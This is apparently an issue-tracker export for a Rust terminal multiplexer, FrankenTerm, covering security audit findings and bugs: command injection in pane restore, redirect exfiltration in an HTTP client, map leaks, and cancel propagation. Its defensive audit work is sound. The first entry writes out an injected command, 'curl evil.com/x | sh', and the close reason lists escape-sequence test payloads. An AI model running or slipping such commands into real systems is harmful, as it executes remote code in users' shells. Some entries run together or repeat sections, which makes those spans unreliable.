2. Snapshot bundle import from an untrusted source — `ft diag
   bundle` round-trips include session data; if someone shares a
   diag bundle and it gets restored, the imported `command`
   values pass through this path.
3. `ft restart --launch-agents` applied after a targeted
   corruption of `mux_pane_state` rows.

Severity: MEDIUM. Not a remote zero-click — requires an existing
trust-boundary crossing — but the defense-in-depth gap is concrete:
a restored `command` like `claude-code\r curl evil.com/x | sh`
would execute the second line in the user's shell on
`ft restart --launch-agents`.

## Fix direction
1. Quick (defense in depth): reject or strip any `\r`/`\n` from
   `command` before formatting. A restored command that needs
   multi-line input is already broken — the typing model assumes
   one command per restore. Concretely:
   ```rust
   if command.chars().any(|c| matches!(c, '\r' | '\n')) {
       return Err(format!(
           "refusing to launch pane {pane_id}: restored command contains CR/LF"
       ));
   }
   ```
2. Proper (larger): route relaunch through `wezterm cli spawn --`
   with argv-isolated arguments instead of typing into an
   interactive shell. Eliminates shell metacharacter concerns
   entirely.

## Non-gaps verified in the same pass
- Snapshot restore has NO direct `fs::write` / `fs::create_dir`
  path (grep confirmed zero hits in session_restore.rs +
  snapshot_engine.rs). Arbitrary-file-write via restore is not
  reachable today.
- Pattern-pack URL loading: `load_pack_from_id` at patterns.rs:963
  accepts only `builtin:` and `file:` schemes; any other scheme
  returns `PackNotFound`. No HTTP/URL fetch surface. **No SSRF.**
- FTS5 query escaping: user query passes to `MATCH ?1` as a bound
  rusqlite parameter at storage.rs:17486/17496; SQL injection is
  impossible and `validate_fts_query` rejects malformed FTS5 DSL
  cleanly. **Clean.**

## Related
- ft-security-mcp-path-traversal (fixed 30988e53) — same class of
  defense-in-depth gap across the MCP tool surface.
- ft-xv561 (fixed 070117a0) — ReDoS via user-pack regexes.

Filed per /security-audit-for-saas pass #4.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T04:28:12.543862Z","created_by":"jemanuel","updated_at":"2026-04-21T04:32:41.769958Z","closed_at":"2026-04-21T04:32:41.769575Z","close_reason":"Closed by 969b9e02. Added sanitize_restored_command() helper in restore_process.rs that rejects \r/\n/ESC/other C0 controls. Wired into both launch_agent_legacy (line 632) and launch_agent_cx (line 656) before format!({command}\r). 8 unit tests cover legitimate inputs (claude-code, codex resume, env-prefixed, UTF-8), the exact attack payload from the bead (claude-code\ninnocent_payload\r), bare CR/LF, OSC via ESC (\x1b]0;pwned\x07), BEL/NUL, and byte-offset fail-fast ordering. Does NOT route through wezterm cli spawn argv-isolated (documented as follow-up); this closure is the defense-in-depth gate at the sanitizer boundary.","source_repo":".","compaction_level":0,"original_size":0,"labels":["command-injection","defense-in-depth","restore","security"]}
 {"id":"ft-kfkyi","title":"DistributedHttpClient must not transparently follow 3xx redirects","description":"# Security: DistributedHttpClient transparent redirect following

## Background
Discovered during ft-xbnl0.2.4 tick 349 verification work. `DistributedHttpClient`
(built on the default asupersync HTTP client config) **follows 3xx redirects
transparently** by default. A 302 with an arbitrary `Location:` header is
followed without caller visibility.

Current behavior is pinned by `distributed_http_client_3xx_redirect_current_behavior_snapshot`
in `crates/frankenterm-core/src/distributed.rs` (tests module) — the test
asserts `Err` on a 302 whose Location is unresolvable, and explicitly
documents that assertion flipping is the trigger for this bead's work.

## Security concern
`DistributedHttpClient` is used for distributed node-to-node RPC (health
checks, event forwarding). Peer URLs are supposed to point at trusted
nodes. Transparent redirect following means:

- A compromised peer can respond `302 Location: http://attacker.com/` →
  next request body is sent to attacker (including event data, pane
  captures, auth tokens).
- Even without compromise, a misconfigured peer with a redirect loop
  could cause unbounded work.

## Fix
Configure `RedirectPolicy::none()` at the `DistributedHttpClient`
construction site — see `crates/frankenterm-core/src/distributed.rs`
around `DistributedHttpClient::new()` and `DistributedHttpClient::plaintext()`.

This forces the caller to explicitly handle (or ignore) the redirect.

## Verification
After the fix:
1. `distributed_http_client_3xx_redirect_current_behavior_snapshot` will
   fail — update it to assert `resp.status == 302` and rename to drop
   the "current-behavior-snapshot" suffix. Rename to
   `distributed_http_client_returns_3xx_redirect_as_ok_response`.
2. Add a second test asserting that a 302 → a different internal host
   is ALSO observable (not followed) — use a second TcpListener in
   the test so the "Location" resolves but the client still doesn't
   follow it.

## Out of scope
- Building a full redirect-following mechanism (if callers want redirects,
  they can opt in explicitly by following the Location themselves after
  inspecting it).
- The asupersync HTTP client's default RedirectPolicy — that's a library
  default and changing it would affect every other caller. The fix is
  to override at the FrankenTerm distributed-client construction site.

## References
- Finding tick: ft-xbnl0.2.4 tick 349 (commit 4013f6e9)
- Related doc: docs/ft-xbnl0-2-4-completion-evidence.md §5 (out of scope carve-out)","status":"closed","priority":2,"issue_type":"task","assignee":"jemanuel","created_at":"2026-04-18T16:59:46.872931Z","created_by":"jemanuel","updated_at":"2026-04-18T17:08:05.852811Z","closed_at":"2026-04-18T17:08:05.852502Z","close_reason":"Completed by tick 351 (commit 4717c434): DistributedHttpClient::new() now constructs via builder with .no_redirects() explicitly. 3xx responses are Ok(Response{status: 3xx}) observable to caller. All 40 ft-xbnl0.2.4 tests still pass via scripts/check_ft_xbnl0_2_4.sh.","source_repo":".","compaction_level":0,"original_size":0,"labels":["asupersync","distributed","http","security"],"dependencies":[{"issue_id":"ft-kfkyi","depends_on_id":"ft-xbnl0.2.4","type":"related","created_at":"2026-04-18T16:59:50.751738Z","created_by":"jemanuel","metadata":"{}","thread_id":""}]}

 {"id":"ft-l6v1r","title":"[mor:distributed-systems] missed PaneDestroyed leaks tier/state maps across the swarm","description":"# Observation

`PaneTierClassifier` holds `RwLock<HashMap<u64, PaneState>>`
(crates/frankenterm-core/src/pane_tiers.rs:238). Entries are added in
`register_pane` and removed in `unregister_pane`. The only thing
driving `unregister_pane` is a PaneDestroyed event flowing through the
native-events channel.

That channel has three failure modes documented in
`dispatch_event_with_timeout_with_cx`:
- `EventDispatchOutcome::Sent` — happy path
- `EventDispatchOutcome::Backpressure` — timeout expired, event dropped
- `EventDispatchOutcome::Closed` — channel gone

Backpressure drops are observable (ft-0e179 covers that), but a
dropped PaneDestroyed event is silently swallowed: the pane's entry
stays in the tier map forever. In a fleet with aggressive pane churn
(200+ panes, short-lived workflow agents), this is an unbounded leak
— map grows monotonically, classify() iterates more entries, the
RwLock hot path gets slower.

# Question

Should PaneTierClassifier have a reconciliation sweep that runs
periodically — say every 60s — and reconciles its HashMap against
`wezterm cli list`'s source-of-truth set of active pane IDs,
unregistering anything that wezterm no longer has? This converts a
silent-forever leak into an eventually-consistent cleanup, at the
cost of one extra `wezterm cli list` per sweep (already cached in
`PaneListCache`).

Same leak shape likely exists in other per-pane maps
(backpressure.paused_panes as Vec<u64>, aegis_backpressure state, any
per-pane metric stores). A crate-wide audit with one shared reconciler
is probably cheaper than 12 one-off fixes.

# CAP stance

Current design is "consistency by event delivery." On paper, the
event stream is authoritative. In practice, bounded queues mean
delivery is not guaranteed. A ground-truth reconciler trades the
"instantaneous" property for "eventually matches reality" — better
for a long-running daemon than the alternative.","status":"closed","priority":3,"issue_type":"question","created_at":"2026-04-21T17:34:51.772093Z","created_by":"mor-review","updated_at":"2026-04-21T20:35:30.788429Z","closed_at":"2026-04-21T20:35:30.788109Z","close_reason":"Verified in d13fe125","source_repo":".","compaction_level":0,"original_size":0,"labels":["distributed-systems","mor","pane-lifecycle"]}
 {"id":"ft-l9mxa","title":"DistributedHttpClient response-read path does not observe mid-flight cx-cancel","description":"# DistributedHttpClient mid-flight cx-cancel gap

## Background
Discovered during ft-xbnl0.2.4 tick 380 verification work. When a caller fires
`cx.cancel_with(...)` WHILE a `DistributedHttpClient::get` is in flight (blocked
reading response bytes from a stalled server), the cancel does NOT propagate to
the HTTP client's read loop.

## Reproduction
The ft-xbnl0.2.4 test
`distributed::tests::distributed_http_client_mid_flight_cancel_does_not_hang`
exercises this. Observed behavior:

    elapsed = 10.02s
    result = Err("deadline has elapsed at Time(10000000041ns)")

The elapsed = ~10s matches the test's DEFENSIVE outer timeout ceiling
(`crate::runtime_compat::timeout(10s, client.get(...))`), not the 50 ms
cx-cancel fire. The cancel went through (cx.is_cancel_requested() would return
true) but the HTTP client's await points didn't observe it.

## Relation to other findings
- **Tick 328** documented that `timeout_with_cx` observes cx *budget deadline*
  but not direct cx *cancel*. This is the same shape of gap at a different
  layer — the HTTP client wraps asupersync::http::h1 whose await points
  don't poll cx.
- **ft-kfkyi** (closed tick 351) was a distinct concern (3xx redirect
  exfil). This finding is lower-severity: not a security issue, just an
  operational-ergonomics gap.

## Impact
- Hung distributed RPC calls will eventually time out via internal limits
  (if any configured) but won't observe operator-initiated cancel.
- Agent workflows that fire cx.cancel to abort a slow peer call will wait
  the full internal-timeout window before the call returns.

## Fix approach (candidate paths)
1. Extend `DistributedHttpClient::get/post` to race the inner future against
   a cx-cancel future (tokio::select! or similar race).
2. Patch asupersync::http::h1 to thread cx through its await points and
   honor cancel at read/write boundaries. Bigger scope; upstream change.
3. Wrap the DistributedHttpClient inner calls in `timeout_with_cx` —
   but per tick 328, that only observes budget, not cancel. So this
   doesn't help unless the caller sets a short budget.

Option (1) is the narrowest change; aligns with the cx-first migration
pattern and doesn't require upstream asupersync work.

## Verification
The existing tick-380 snapshot test is the flip trigger. When the fix lands:
1. Observed elapsed drops from ~10s to << 10s (cx-cancel observed mid-read).
2. `result` shape changes from the outer-timeout Err to the HTTP client's
   own cancel-shaped Err.
3. Update the snapshot assertions to require the faster behavior.

## References
- Finding: ft-xbnl0.2.4 tick 380 (commit 4d925607)
- Related: `docs/ft-xbnl0-2-4-completion-evidence.md §5` out-of-scope carve-out
  for primitive-doc-only coverage (timeout_with_cx / sleep_with_cx — ticks
  328 / 331).","status":"closed","priority":3,"issue_type":"task","assignee":"jemanuel","created_at":"2026-04-18T20:12:43.612639Z","created_by":"jemanuel","updated_at":"2026-04-18T20:50:48.342908Z","closed_at":"2026-04-18T20:50:48.342659Z","close_reason":"Fixed by tick 387 (commit 99640e41): DistributedHttpClient::{get,post} now race inner call against cx-cancel watcher (50ms poll). Mid-flight cancel surfaces as Ok(Err(Cancelled)) in ~70ms. Tick-380 snapshot test tightened to assert the new fast-cancel behavior (elapsed < 1s, exact Cancelled variant).","source_repo":".","compaction_level":0,"original_size":0,"labels":["asupersync","cx-cancel","distributed","http"],"dependencies":[{"issue_id":"ft-l9mxa","depends_on_id":"ft-xbnl0.2.4","type":"related","created_at":"2026-04-18T20:12:58.856854Z","created_by":"jemanuel","metadata":"{}","thread_id":""}]}

 {"id":"ft-rrrn5","title":"[SEV] CommandBuilder env_map_serde silently collides duplicate keys after to_string_lossy","description":"frankenterm/pty/src/cmdbuilder.rs env_map_serde (added in 803356bf) maps BTreeMap<OsString, EnvEntry> -> JSON via OsString::to_string_lossy for keys. The adapter offers no detection or rejection of this case — a corrupted env set roundtrips to a smaller env set with no diagnostic. Fix by either (a) erroring on lossy conversion in both directions, or (b) serializing as an array of [key_bytes, value] pairs via serde_bytes / base64 so the roundtrip is lossless. At minimum add a proptest that asserts roundtrip preserves map size when two synthesized OsString keys share a lossy-equivalent representation.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-20T07:02:30.464855Z","created_by":"jemanuel","updated_at":"2026-04-20T07:35:11.565957Z","closed_at":"2026-04-20T07:35:11.565787Z","close_reason":"Fixed in 7a452b96: replaced map adapter with sequence-of-pairs adapter so every distinct OsString key survives serde roundtrip losslessly (via OsString's native byte/UTF-16-preserving enum encoding in value position). -{"id":"ft-s6l5b","title":"[testing-fuzzing] pin match_rule_glob invariants under proptest (empty patterns, star-wildcards, length preservation)","description":"# Gap

events.rs:1121 `pub fn match_rule_glob(pattern, value) -> bool` —
a hand-rolled glob matcher with `*` (any sequence) and `?` (any
single char) support. 19 inline example tests at events.rs:2827+ cover
specific cases. No proptest / property-based coverage exists.

# Risk

Hand-rolled glob matchers are classic defect surfaces — backtrack
state machines have edge cases that example tests routinely miss:

1. Empty-pattern vs empty-value semantics (false positives here
   would break exclude rules)
2. Pattern of N `?`s must match exactly N-char values (length-
   preservation invariant that's easy to regress with an off-by-one)
3. `"*"` alone must match every value (including empty) — this is
   the "allow-everything" escape hatch operators rely on
4. Exact patterns (no wildcards) must be length-preserving: only
   match same-length values with same bytes
5. Idempotence: `match_rule_glob(x, x) == true` for any exact pattern x

# Fix

# Risk

Hand-rolled glob matchers are classic defect surfaces — backtrack
state machines have edge cases that example tests routinely miss:

1. Empty-pattern vs empty-value semantics (false positives here
   would break exclude rules)
2. Pattern of N `?`s must match exactly N-char values (length-
   preservation invariant that's easy to regress with an off-by-one)
3. `"*"` alone must match every value (including empty) — this is
   the "allow-everything" escape hatch operators rely on
4. Exact patterns (no wildcards) must be length-preserving: only
   match same-length values with same bytes
5. Idempotence: `match_rule_glob(x, x) == true` for any exact pattern x

# Fix

New proptest suite in events.rs test module with 5 invariant properties,
each bearing the domain check the hand-rolled state machine is supposed
to guarantee. Runs under the existing module's test harness — no new
test file or feature-gate.

 {"id":"ft-s9oci","title":"mux/domain follow-ups: blocking spawn_command in async, silent write! errors","description":"Deferred during /multi-pass-bug-hunting audit shipped as dcaf60ca. Three pass-1/2 findings were clean in domain.rs, but two design-level issues remain as follow-up work:

1. Blocking spawn inside async fn. LocalDomain::spawn_pane (domain.rs:667) calls pair.slave.spawn_command(cmd) which on Unix is a synchronous fork+exec. If the child binary or an interposed fork hook hangs, the async task's executor thread is blocked indefinitely. Fix direction: route the spawn through tokio::task::spawn_blocking (or the asupersync equivalent) and await the join handle. Scope: also audit pair.master.take_writer() on the same path.

2. Silently swallowed write! errors. LocalDomain::spawn_pane on the child-spawn-failure branch (domain.rs:693) renders the error into the new pane via write!(writer, "{err:#}").ok(). If the write itself fails the user sees a blank pane with no indication of the upstream spawn failure. Fix direction: log the nested error via tracing::warn! with both the original spawn err and the write err so the failure is at least visible in logs.

Auditor: pane 6 (2026-04-20).
